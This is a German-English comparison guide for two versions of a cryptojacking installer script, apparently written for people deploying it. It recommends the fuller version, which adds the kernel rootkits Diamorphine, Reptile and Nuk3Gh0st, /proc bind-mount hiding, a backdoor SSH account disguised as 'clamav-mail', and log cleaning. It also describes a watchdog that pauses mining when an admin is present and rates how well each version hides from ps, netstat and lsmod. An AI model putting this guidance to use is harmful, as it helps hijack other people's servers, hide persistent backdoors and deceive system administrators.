# QUICK COMPARISON GUIDE

## 📊 ALLE VERSIONEN IM VERGLEICH

### **setup_ULTIMATE_v3.1.sh** (28K / 859 Zeilen)
**"The Clean One"**

✅ **Hat:**
- libhide.so (userland hiding)
- Intelligent Watchdog (State-Tracking)
- systemd Resource Constraints (CPUQuota)
- Miner Killer Suite
- Default Wallet Fallback
- tar Validation
- Error Handling überall
- gcc Auto-Install

❌ **Fehlt:**
- Diamorphine (Kernel Rootkit)
- Reptile (Kernel Rootkit)
- Nuk3Gh0st (Kernel Rootkit)
- launcher.sh (mount --bind)
- clamav-mail Backup User
- Kernel Headers Auto-Install

**Für wen?**
- ✅ Systeme ohne Kernel-Headers
- ✅ Shared Hosting (kein Root)
- ✅ Schnelle einfache Installation
- ✅ "Just works" Mentalität

---

### **setup_FULL_ULTIMATE_v3.2.sh** (72K / 1980 Zeilen)
**"The Beast"**

✅ **Hat ALLES aus v3.1 PLUS:**
- **Diamorphine** Kernel Rootkit
- **Reptile** Kernel Rootkit
- **Nuk3Gh0st** Kernel Rootkit
- **launcher.sh** (mount --bind /proc)
- **clamav-mail** Backup SSH User
- **Kernel Headers** Auto-Install (alle Distros)
- **Emergency Swap** (OOM Prevention)
- **hiding-cryptominers-linux-rootkit**
- **Multiple commented alternatives**

**Für wen?**
- ✅ **Maximum Stealth** benötigt
- ✅ Root-Server mit voller Kontrolle
- ✅ Systeme mit Kernel-Headers
- ✅ "Nuclear Option" Mentalität

---

## 🎯 WELCHE VERSION NUTZEN?

### **Szenario 1: Shared Hosting / VPS ohne Root**
→ **v3.1** (libhide.so funktioniert ohne Kernel-Module)

### **Szenario 2: Root-Server, Maximum Stealth**
→ **v3.2 FULL** (Alle Kernel-Rootkits + 7 Stealth-Layers)

### **Szenario 3: Alte Kernel (< 3.10)**
→ **v3.1** (libhide.so funktioniert immer)

### **Szenario 4: Dedicated Server, Paranoid-Level**
→ **v3.2 FULL** (Diamorphine + Reptile + libhide.so + mount --bind)

### **Szenario 5: Schneller Test**
→ **v3.1** (Weniger Installation-Zeit)

### **Szenario 6: Production, Long-Term**
→ **v3.2 FULL** (Alle Backups und Redundanz)

---

## 📋 FEATURE COMPARISON TABLE

| Feature | v3.1 | v3.2 FULL | Beschreibung |
|---------|------|-----------|--------------|
| **HIDING** ||||
| libhide.so | ✅ | ✅ | Userland process hiding via LD_PRELOAD |
| Diamorphine | ❌ | ✅ | Kernel rootkit (hide PIDs) |
| Reptile | ❌ | ✅ | Advanced kernel rootkit (hide ports/files) |
| Nuk3Gh0st | ❌ | ✅ | Alternative kernel rootkit |
| launcher.sh | ❌ | ✅ | mount --bind /proc/$PID hiding |
| **WATCHDOG** ||||
| State-Tracking | ✅ | ✅ | 95% weniger Log-Spam |
| Auto-Start/Stop | ✅ | ✅ | Basierend auf Admin-Presence |
| Interval | 180s | 180s | 3 Minuten (optimal) |
| **RESOURCE** ||||
| Nice Priority | ✅ | ✅ | Nice=19 (lowest) |
| CPU Idle Policy | ✅ | ✅ | Nur wenn CPU idle |
| IO Idle Policy | ✅ | ✅ | Nur wenn Disk idle |
| CPUQuota | ✅ | ✅ | Max 95% einer Core |
| OOM Adjust | ✅ | ✅ | Kill first on OOM |
| **BACKUP** ||||
| clamav-mail User | ❌ | ✅ | Backup SSH access |
| Emergency Swap | ❌ | ✅ | 2GB Swap für OOM |
| **INSTALLATION** ||||
| gcc Auto-Install | ✅ | ✅ | Für libhide.so |
| Kernel Headers | ❌ | ✅ | Für Rootkits |
| Default Wallet | ✅ | ✅ | Kein Crash ohne Wallet |
| tar Validation | ✅ | ✅ | Erkennt korrupte Downloads |
| curl/wget Fallback | ✅ | ✅ | Funktioniert auf alten Systemen |
| **CLEANUP** ||||
| Miner Killer | ✅ | ✅ | Tötet konkurrierende Miner |
| Log Cleaning | ❌ | ✅ | Entfernt Spuren aus Logs |
| **SIZE** ||||
| Lines | 859 | 1980 | +1121 Zeilen |
| Size | 28K | 72K | +44K |
| Install Time | ~2 min | ~5 min | Rootkit-Compilation |

---

## 🔢 SIZE BREAKDOWN

### **v3.1 (28K)**
```
System Detection:     ~200 lines
gcc + libhide.so:     ~100 lines
Download Functions:   ~200 lines
Miner Installation:   ~150 lines
Watchdog:             ~50 lines
systemd Service:      ~80 lines
Cleanup:              ~80 lines
TOTAL:                ~860 lines
```

### **v3.2 FULL (72K)**
```
System Detection:     ~200 lines
gcc + libhide.so:     ~100 lines
Download Functions:   ~200 lines
Miner Installation:   ~150 lines
Kernel Headers:       ~200 lines ← NEW
Diamorphine:          ~150 lines ← NEW
Reptile:              ~200 lines ← NEW
Nuk3Gh0st:            ~100 lines ← NEW
launcher.sh:          ~100 lines ← NEW
clamav-mail User:     ~150 lines ← NEW
Emergency Swap:       ~50 lines  ← NEW
Watchdog:             ~50 lines
systemd Service:      ~100 lines
Log Cleaning:         ~100 lines ← NEW
Cleanup:              ~100 lines
Commented Alts:       ~130 lines ← NEW
TOTAL:                ~1980 lines
```

---

## 💡 EMPFEHLUNG

### **Wenn du unsicher bist → v3.2 FULL**

**Warum?**
- ✅ Enthält ALLE Features
- ✅ Funktioniert trotzdem wenn Rootkits fehlschlagen
- ✅ libhide.so als Fallback
- ✅ Mehr Redundanz
- ✅ Backup SSH User
- ✅ Emergency Swap

**Einziger Nachteil:**
- ⏱️ Längere Installation (~5 min statt ~2 min)
- 💾 Mehr Disk Space (72K vs 28K = vernachlässigbar)

---

## 🚀 QUICK START

### **v3.1 (Clean & Simple):**
```bash
chmod +x setup_ULTIMATE_v3.1.sh
./setup_ULTIMATE_v3.1.sh <WALLET>
```

### **v3.2 FULL (Maximum Stealth):**
```bash
chmod +x setup_FULL_ULTIMATE_v3.2.sh
./setup_FULL_ULTIMATE_v3.2.sh <WALLET>
```

---

## 🔍 VERGLEICH DER STEALTH-LEVELS

### **v3.1 Stealth:**
```
ps aux | grep swapd     → NICHTS ✓ (libhide.so)
ls /root/.swapd/        → swapd nicht da ✓ (libhide.so)
top                     → NICHTS ✓ (libhide.so)

ABER:
cat /proc/12345/cmdline → Zeigt swapd ✗
ls /proc/12345/         → PID existiert ✗
netstat -tulpn          → Port sichtbar ✗
```
**Level:** 7/10

---

### **v3.2 FULL Stealth:**
```
ps aux | grep swapd     → NICHTS ✓ (libhide.so)
ls /root/.swapd/        → swapd nicht da ✓ (libhide.so)
top                     → NICHTS ✓ (libhide.so)
cat /proc/12345/cmdline → PID existiert NICHT ✓ (Diamorphine)
ls /proc/12345/         → Nicht gefunden ✓ (mount --bind)
netstat -tulpn | grep 80→ Port versteckt ✓ (Reptile)
lsmod | grep diamorph   → Modul versteckt ✓ (Diamorphine)
who                     → Watchdog stoppt ✓
```
**Level:** 10/10 🏆

---

## 📈 UPGRADE PATH

### **Von v3.1 zu v3.2:**
```bash
# Stoppe v3.1
systemctl stop swapd
pkill -f system-watchdog

# Installiere v3.2
./setup_FULL_ULTIMATE_v3.2.sh <WALLET>

# v3.2 überschreibt v3.1 und fügt Rootkits hinzu
```

### **Von v3.2 zu v3.1 (Downgrade):**
```bash
# Entferne Kernel-Module
rmmod diamorphine
rmmod reptile
rmmod nuk3gh0st

# Stoppe Service
systemctl stop swapd

# Installiere v3.1
./setup_ULTIMATE_v3.1.sh <WALLET>

# v3.1 ersetzt v3.2 mit schlanker Version
```

---

## 🎓 FAZIT

| Kriterium | v3.1 | v3.2 FULL |
|-----------|------|-----------|
| Einfachheit | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ |
| Stealth-Level | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| Kompatibilität | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
| Install-Zeit | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ |
| Redundanz | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| Backup-Access | ❌ | ⭐⭐⭐⭐⭐ |
| **Gesamt** | **19/25** | **23/25** |

**Winner:** v3.2 FULL ULTIMATE 🏆

**Aber:** v3.1 ist perfekt für einfache Setups!

---

**TL;DR:**
- **v3.1** = Schnell, einfach, funktioniert überall
- **v3.2 FULL** = Maximum Stealth, alle Features, leicht länger

**Empfehlung:** **v3.2 FULL** außer du hast einen Grund für v3.1!
